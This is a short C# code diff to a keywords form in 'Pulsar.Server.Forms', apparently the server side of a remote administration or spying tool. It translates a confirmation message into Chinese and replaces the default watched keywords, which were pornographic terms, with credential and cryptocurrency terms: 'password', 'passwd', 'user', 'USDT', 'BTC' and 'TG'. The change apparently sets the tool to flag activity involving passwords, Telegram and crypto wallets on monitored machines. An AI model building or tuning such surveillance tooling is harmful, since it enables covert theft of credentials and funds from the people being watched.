@@ -34,7 +34,7 @@ namespace Pulsar.Server.Forms
                 Directory.CreateDirectory(PulsarStuffDir);
             }
             File.WriteAllText(filePath, json, Encoding.UTF8);
-            MessageBox.Show("Keywords saved successfully!");
+            MessageBox.Show("关键词保存成功！");
         }
 
         private void FrmKeywords_Load(object sender, EventArgs e)
@@ -42,7 +42,7 @@ namespace Pulsar.Server.Forms
             string filePath = Path.Combine(PulsarStuffDir, "keywords.json");
             if (!File.Exists(filePath))
             {
-                var exampleKeywords = new List<string> { "porn", "sex", "xxx", "hentai", "boobs", "tits", "cock", "dick", "pussy" };
+                var exampleKeywords = new List<string> { "USDT", "passwd", "password", "user", "TG", "BTC"};
                 string exampleJson = JsonConvert.SerializeObject(exampleKeywords, Formatting.Indented);
                 if (!Directory.Exists(PulsarStuffDir))
                 {
